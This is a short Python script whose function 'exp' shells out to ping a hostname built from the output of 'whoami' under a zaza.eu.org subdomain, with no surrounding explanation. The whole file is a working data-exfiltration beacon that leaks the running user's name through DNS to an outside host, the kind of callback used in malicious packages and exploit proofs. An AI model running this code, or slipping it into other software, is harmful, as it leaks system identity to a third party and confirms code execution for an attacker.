import subprocess
def exp():
  command = ["sh", "-c", "ping `whoami`.dztkmcpycc.zaza.eu.org"] 
  subprocess.run (command, check=False)

if __name__ == "__main__":
  exp ()
